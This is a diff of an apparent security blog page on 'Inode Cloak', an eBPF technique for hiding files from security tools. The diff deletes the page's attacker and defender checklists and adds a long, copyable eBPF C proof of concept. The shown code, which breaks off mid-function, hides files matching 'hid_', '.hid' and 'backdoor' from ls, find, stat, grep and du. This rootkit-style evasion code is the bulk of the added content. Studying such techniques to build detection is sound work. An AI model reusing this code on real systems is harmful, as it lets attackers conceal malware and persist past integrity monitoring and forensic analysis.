@@ -156,243 +156,6 @@
                     
                     
                 
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
             </div>
         </nav>
 
@@ -415,7 +178,8 @@
 
 <p>A technique that uses eBPF to manipulate inode operations, allowing attackers to hide files, directories, and their contents from detection systems while maintaining full access for themselves. This “cloaking” capability undermines file integrity monitoring, antivirus scanning, and forensic analysis tools.</p>
 
-<pre><code class="language-mermaid">graph TD
+<pre><code class="language-mermaid">%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
+graph TD
     A[Detection System] --&gt;|1. File Lookup| B[VFS Layer]
     B --&gt;|2. Inode Operation| C[Filesystem]
     D[eBPF Program] --&gt;|3. Hook &amp; Intercept| B
@@ -423,53 +187,24 @@
     A --&gt;|5. Receives| E
     F[Attacker Process] --&gt;|6. Direct Access| C
     G[Security Monitor] --&gt;|7. Sees Nothing| H[False Security]
+    
+    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
+    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
+    style C fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
+    style D fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
+    style E fill:#7e5109,stroke:#f5cba7,stroke-width:2px
+    style F fill:#186a3b,stroke:#a9dfbf,stroke-width:2px
+    style G fill:#a93226,stroke:#f5b7b1,stroke-width:2px
+    style H fill:#cb4335,stroke:#f5b7b1,stroke-width:2px
+    
+    click B "https://www.kernel.org/doc/html/latest/filesystems/vfs.html" "VFS Documentation"
+    click C "https://www.kernel.org/doc/html/latest/filesystems/index.html" "Linux Filesystems"
+    click D "https://ebpf.io/what-is-ebpf/" "eBPF Documentation"
 </code></pre>
 
 <p><strong>Why</strong></p>
 
 <p>Because eBPF + misconfiguration =&gt; broken isolation. File visibility is fundamental to security monitoring, malware detection, and forensic analysis. By manipulating inode operations through eBPF, attackers can create a parallel reality where their malicious files are invisible to security tools while remaining fully functional and accessible to the attacker, effectively bypassing most detection mechanisms.</p>
-
-<p><strong>POC</strong></p>
-
-<p><em>Coming soon.</em></p>
-
-<p>The proof of concept will demonstrate:</p>
-<ul>
-  <li>Hooking into key VFS and inode operations</li>
-  <li>Selectively hiding files and directories from listing operations</li>
-  <li>Maintaining full access to hidden files for authorized processes</li>
-  <li>Bypassing file integrity monitoring systems</li>
-  <li>Evading detection by common security tools</li>
-</ul>
-
-<p><strong>Attacker hat on</strong></p>
-
-<ol>
-  <li>Identify a target system with eBPF capabilities</li>
-  <li>Map the kernel functions responsible for filesystem operations</li>
-  <li>Develop an eBPF program that hooks into VFS and inode functions</li>
-  <li>Load the malicious BPF program with appropriate privileges</li>
-  <li>Create a mechanism to identify “authorized” processes</li>
-  <li>Hide malicious files, directories, and their contents from detection</li>
-  <li>Maintain full access to hidden files for authorized processes</li>
-  <li>Establish persistence through hidden files and directories</li>
-</ol>
-
-<p><strong>Defender hat on</strong></p>
-
-<ol>
-  <li>Remove CAP_BPF from untrusted processes</li>
-  <li>Implement BPF LSM policies to restrict eBPF program loading</li>
-  <li>Use multiple, independent file integrity monitoring mechanisms</li>
-  <li>Implement kernel-level integrity verification</li>
-  <li>Monitor for unexpected eBPF programs attached to filesystem functions</li>
-  <li>Consider using eBPF-based security tools that can detect malicious eBPF usage</li>
-</ol>
-
-<p><strong>Conclusion</strong></p>
-
-<p><code class="language-plaintext highlighter-rouge">eBPF is all you need</code>. The ability to cloak files and directories from detection systems while maintaining full access creates a particularly dangerous scenario where malicious activity can persist undetected. This technique highlights why eBPF capabilities should be treated as highly privileged operations that require strict access controls, especially in environments where file integrity is critical.</p>
-
 <h2 id="technical-details">Technical Details</h2>
 
 <h3 id="filesystem-and-inode-architecture">Filesystem and Inode Architecture</h3>
@@ -485,6 +220,154 @@
 
 <p>These components work together to provide file access and management capabilities.</p>
 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+</pre></td><td class="rouge-code"><pre>┌─────────────────────────────────────────────────────────────┐
+│                      User Space                             │
+│                                                             │
+│  ┌───────────────┐      ┌───────────────┐                   │
+│  │ Application   │      │ Security Tool │                   │
+│  └───────┬───────┘      └───────┬───────┘                   │
+│          │                      │                           │
+└──────────┼──────────────────────┼───────────────────────────┘
+           │                      │
+┌──────────▼──────────────────────▼───────────────────────────┐
+│                      Kernel Space                           │
+│                                                             │
+│  ┌───────────────┐                                          │
+│  │ System Call   │                                          │
+│  │ Interface     │                                          │
+│  └───────┬───────┘                                          │
+│          │                                                  │
+│  ┌───────▼───────┐                                          │
+│  │ VFS Layer     │                                          │
+│  └───────┬───────┘                                          │
+│          │                                                  │
+│  ┌───────▼───────┐      ┌───────────────┐                   │
+│  │ Inode Ops     │      │ File Ops      │                   │
+│  └───────┬───────┘      └───────┬───────┘                   │
+│          │                      │                           │
+│  ┌───────▼──────────────────────▼───────┐                   │
+│  │           Filesystem Implementation  │                   │
+│  └──────────────────┬───────────────────┘                   │
+│                     │                                       │
+│  ┌──────────────────▼───────────────────┐                   │
+│  │           Storage Device              │                   │
+│  └────────────────────────────────────────────────────────┘ │
+└─────────────────────────────────────────────────────────────┘
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>When eBPF is used to manipulate filesystem operations, the architecture is subverted:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+</pre></td><td class="rouge-code"><pre>┌─────────────────────────────────────────────────────────────┐
+│                      User Space                             │
+│                                                             │
+│  ┌───────────────┐      ┌───────────────┐                   │
+│  │ Attacker      │      │ Security Tool │                   │
+│  │ Application   │      │               │                   │
+│  └───────┬───────┘      └───────┬───────┘                   │
+│          │                      │                           │
+└──────────┼──────────────────────┼───────────────────────────┘
+           │                      │
+┌──────────▼──────────────────────▼───────────────────────────┐
+│                      Kernel Space                           │
+│                                                             │
+│  ┌───────────────┐                                          │
+│  │ System Call   │                                          │
+│  │ Interface     │                                          │
+│  └───────┬───────┘                                          │
+│          │                                                  │
+│  ┌───────▼───────┐                                          │
+│  │ VFS Layer     │◀─────┐                                   │
+│  └───────┬───────┘      │                                   │
+│          │              │                                   │
+│  ┌───────┴───────┐      │                                   │
+│  │ eBPF Program  │──────┘                                   │
+│  └───────────────┘                                          │
+│          │                                                  │
+│  ┌───────▼───────┐      ┌───────────────┐                   │
+│  │ Inode Ops     │      │ File Ops      │                   │
+│  └───────┬───────┘      └───────┬───────┘                   │
+│          │                      │                           │
+│  ┌───────▼──────────────────────▼───────┐                   │
+│  │           Filesystem Implementation  │                   │
+│  └──────────────────┬───────────────────┘                   │
+│                     │                                       │
+│  ┌──────────────────▼───────────────────┐                   │
+│  │           Storage Device              │                   │
+│  └────────────────────────────────────────────────────────┘ │
+└─────────────────────────────────────────────────────────────┘
+</pre></td></tr></tbody></table></code></pre></div></div>
+
 <h3 id="exploitation-technique">Exploitation Technique</h3>
 
 <p>The exploit leverages eBPF’s ability to attach to kernel functions that implement filesystem operations. By intercepting these calls, an attacker can:</p>
@@ -494,10 +377,10 @@
   <li><strong>Filter file lookups</strong>: Modify the results of <code class="language-plaintext highlighter-rouge">lookup_fast()</code> or similar functions</li>
   <li><strong>Manipulate stat operations</strong>: Change the output of <code class="language-plaintext highlighter-rouge">vfs_stat()</code> to hide file metadata</li>
   <li><strong>Control file access</strong>: Allow or deny access based on process credentials</li>
-  <li><strong>Maintain stealth</strong>: Ensure monitoring tools see a sanitized view of the filesystem</li>
+  <li><strong>Maintain stealth</strong>: Ensure monitoring tools see a sanitized view of the filesystem
+    <h3 id="comprehensive-poc">Comprehensive POC</h3>
+  </li>
 </ol>
-
-<h3 id="code-snippet">Code Snippet</h3>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
@@ -591,24 +474,621 @@
 90
 91
 92
-</pre></td><td class="rouge-code"><pre><span class="c1">// Simplified eBPF program to cloak files from detection</span>
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208
+209
+210
+211
+212
+213
+214
+215
+216
+217
+218
+219
+220
+221
+222
+223
+224
+225
+226
+227
+228
+229
+230
+231
+232
+233
+234
+235
+236
+237
+238
+239
+240
+241
+242
+243
+244
+245
+246
+247
+248
+249
+250
+251
+252
+253
+254
+255
+256
+257
+258
+259
+260
+261
+262
+263
+264
+265
+266
+267
+268
+269
+270
+271
+272
+273
+274
+275
+276
+277
+278
+279
+280
+281
+282
+283
+284
+285
+286
+287
+288
+289
+290
+291
+292
+293
+294
+295
+296
+297
+298
+299
+300
+301
+302
+303
+304
+305
+306
+307
+308
+309
+310
+311
+312
+313
+314
+315
+316
+317
+318
+319
+320
+321
+322
+323
+324
+325
+326
+327
+328
+329
+330
+331
+332
+333
+334
+335
+336
+337
+338
+339
+340
+341
+342
+343
+344
+345
+346
+347
+348
+349
+350
+351
+352
+353
+354
+355
+356
+357
+358
+359
+360
+361
+362
+363
+364
+365
+366
+367
+368
+369
+370
+371
+372
+373
+374
+375
+376
+377
+378
+379
+380
+381
+382
+383
+384
+385
+386
+387
+388
+389
+390
+391
+392
+393
+394
+395
+396
+397
+398
+399
+400
+401
+402
+403
+404
+405
+406
+407
+408
+409
+</pre></td><td class="rouge-code"><pre><span class="c1">// @interactive: true</span>
+<span class="c1">// @copyable: true</span>
+<span class="c1">// Inode Cloak - eBPF exploitation proof of concept</span>
+<span class="c1">// This demonstrates hiding files from detection systems</span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;linux/bpf.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;bpf/bpf_helpers.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/version.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/fs.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/dcache.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/path.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/stat.h&gt;</span><span class="cp">
+</span>
+<span class="kt">char</span> <span class="n">LICENSE</span><span class="p">[]</span> <span class="n">SEC</span><span class="p">(</span><span class="s">"license"</span><span class="p">)</span> <span class="o">=</span> <span class="s">"GPL"</span><span class="p">;</span>
+
+<span class="c1">// Configuration</span>
+<span class="cp">#define MAX_PATH_LEN 256
+#define MAX_HIDDEN_FILES 32
+#define MAX_COMM_LEN 16
+#define MAX_TARGETS 5
+</span>
+<span class="c1">// Structure to track file access events</span>
+<span class="k">struct</span> <span class="n">file_event</span> <span class="p">{</span>
+    <span class="n">u32</span> <span class="n">pid</span><span class="p">;</span>                <span class="c1">// Process ID</span>
+    <span class="n">u8</span> <span class="n">comm</span><span class="p">[</span><span class="n">MAX_COMM_LEN</span><span class="p">];</span>  <span class="c1">// Command name</span>
+    <span class="n">u64</span> <span class="n">timestamp</span><span class="p">;</span>          <span class="c1">// Event timestamp</span>
+    <span class="n">u8</span> <span class="n">path</span><span class="p">[</span><span class="n">MAX_PATH_LEN</span><span class="p">];</span>  <span class="c1">// File path</span>
+    <span class="n">u32</span> <span class="n">operation</span><span class="p">;</span>          <span class="c1">// 1 = open, 2 = stat, 3 = readdir</span>
+    <span class="n">u32</span> <span class="n">hidden</span><span class="p">;</span>             <span class="c1">// Whether the file was hidden</span>
+<span class="p">};</span>
+
+<span class="c1">// Map to store hidden file patterns</span>
+<span class="k">struct</span> <span class="p">{</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">BPF_MAP_TYPE_ARRAY</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">key_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">value_size</span><span class="p">,</span> <span class="n">MAX_PATH_LEN</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">max_entries</span><span class="p">,</span> <span class="n">MAX_HIDDEN_FILES</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">hidden_files</span> <span class="nf">SEC</span><span class="p">(</span><span class="s">".maps"</span><span class="p">);</span>
+
+<span class="c1">// Map to track processes we want to hide files from</span>
+<span class="k">struct</span> <span class="p">{</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">BPF_MAP_TYPE_HASH</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">key_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">));</span>  <span class="c1">// PID as key</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">value_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u8</span><span class="p">));</span> <span class="c1">// Flag (1 = target)</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">max_entries</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">target_processes</span> <span class="nf">SEC</span><span class="p">(</span><span class="s">".maps"</span><span class="p">);</span>
+
+<span class="c1">// Map to track commands we want to hide files from</span>
+<span class="k">struct</span> <span class="p">{</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">BPF_MAP_TYPE_ARRAY</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">key_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">value_size</span><span class="p">,</span> <span class="n">MAX_COMM_LEN</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">max_entries</span><span class="p">,</span> <span class="n">MAX_TARGETS</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">target_commands</span> <span class="nf">SEC</span><span class="p">(</span><span class="s">".maps"</span><span class="p">);</span>
+
+<span class="c1">// Map to track if we've initialized our targets</span>
+<span class="k">struct</span> <span class="p">{</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">BPF_MAP_TYPE_ARRAY</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">key_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">value_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">max_entries</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">initialized</span> <span class="nf">SEC</span><span class="p">(</span><span class="s">".maps"</span><span class="p">);</span>
+
+<span class="c1">// Map to track directory iteration state</span>
+<span class="k">struct</span> <span class="p">{</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">BPF_MAP_TYPE_HASH</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">key_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">));</span>  <span class="c1">// PID as key</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">value_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">));</span> <span class="c1">// Flag (1 = filtering)</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">max_entries</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">dir_filter_map</span> <span class="nf">SEC</span><span class="p">(</span><span class="s">".maps"</span><span class="p">);</span>
+
+<span class="c1">// Perf event output for logging</span>
+<span class="k">struct</span> <span class="p">{</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">BPF_MAP_TYPE_PERF_EVENT_ARRAY</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">key_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">value_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">max_entries</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">events</span> <span class="nf">SEC</span><span class="p">(</span><span class="s">".maps"</span><span class="p">);</span>
+
+<span class="c1">// Initialize our target commands and hidden files (would be set from user space)</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">void</span> <span class="nf">init_targets</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">u32</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">u32</span> <span class="o">*</span><span class="n">init</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">initialized</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">);</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">init</span> <span class="o">||</span> <span class="o">*</span><span class="n">init</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// Commands to hide files from</span>
+        <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">cmd1</span><span class="p">[</span><span class="n">MAX_COMM_LEN</span><span class="p">]</span> <span class="o">=</span> <span class="s">"ls"</span><span class="p">;</span>  <span class="c1">// Directory listing</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_commands</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cmd1</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        
+        <span class="n">key</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">cmd2</span><span class="p">[</span><span class="n">MAX_COMM_LEN</span><span class="p">]</span> <span class="o">=</span> <span class="s">"find"</span><span class="p">;</span>  <span class="c1">// File search</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_commands</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cmd2</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        
+        <span class="n">key</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">cmd3</span><span class="p">[</span><span class="n">MAX_COMM_LEN</span><span class="p">]</span> <span class="o">=</span> <span class="s">"stat"</span><span class="p">;</span>  <span class="c1">// File status</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_commands</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cmd3</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        
+        <span class="n">key</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">cmd4</span><span class="p">[</span><span class="n">MAX_COMM_LEN</span><span class="p">]</span> <span class="o">=</span> <span class="s">"grep"</span><span class="p">;</span>  <span class="c1">// Content search</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_commands</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cmd4</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        
+        <span class="n">key</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">cmd5</span><span class="p">[</span><span class="n">MAX_COMM_LEN</span><span class="p">]</span> <span class="o">=</span> <span class="s">"du"</span><span class="p">;</span>  <span class="c1">// Disk usage</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_commands</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cmd5</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        
+        <span class="c1">// Files to hide</span>
+        <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">file1</span><span class="p">[</span><span class="n">MAX_PATH_LEN</span><span class="p">]</span> <span class="o">=</span> <span class="s">"hid_"</span><span class="p">;</span>  <span class="c1">// Files with this prefix</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hidden_files</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">file1</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        
+        <span class="n">key</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">file2</span><span class="p">[</span><span class="n">MAX_PATH_LEN</span><span class="p">]</span> <span class="o">=</span> <span class="s">".hid"</span><span class="p">;</span>  <span class="c1">// Hidden files with this extension</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hidden_files</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">file2</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        
+        <span class="n">key</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">file3</span><span class="p">[</span><span class="n">MAX_PATH_LEN</span><span class="p">]</span> <span class="o">=</span> <span class="s">"backdoor"</span><span class="p">;</span>  <span class="c1">// Files containing this string</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hidden_files</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">file3</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        
+        <span class="c1">// Mark as initialized</span>
+        <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">u32</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">initialized</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// Helper function to check if a command should be filtered</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="n">bool</span> <span class="nf">should_filter_command</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">comm</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">init_targets</span><span class="p">();</span>
+    
+    <span class="c1">// Check against our list of target commands</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAX_TARGETS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">u32</span> <span class="n">key</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="o">*</span><span class="n">target_comm</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_commands</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">);</span>
+        
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">target_comm</span><span class="p">)</span>
+            <span class="k">continue</span><span class="p">;</span>
+        
+        <span class="c1">// Simple string comparison (limited by BPF verifier)</span>
+        <span class="n">bool</span> <span class="n">match</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+        
+        <span class="cp">#pragma unroll
+</span>        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">MAX_COMM_LEN</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">comm</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">!=</span> <span class="n">target_comm</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="p">{</span>
+                <span class="n">match</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+            
+            <span class="k">if</span> <span class="p">(</span><span class="n">comm</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\0'</span><span class="p">)</span>
+                <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+        
+        <span class="k">if</span> <span class="p">(</span><span class="n">match</span><span class="p">)</span>
+            <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Helper function to check if a process should be filtered</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="n">bool</span> <span class="nf">should_filter_process</span><span class="p">(</span><span class="n">u32</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Check if this PID is in our tracking map</span>
+    <span class="n">u8</span> <span class="o">*</span><span class="n">target</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_processes</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pid</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">target</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">target</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+    
+    <span class="c1">// Check the command name</span>
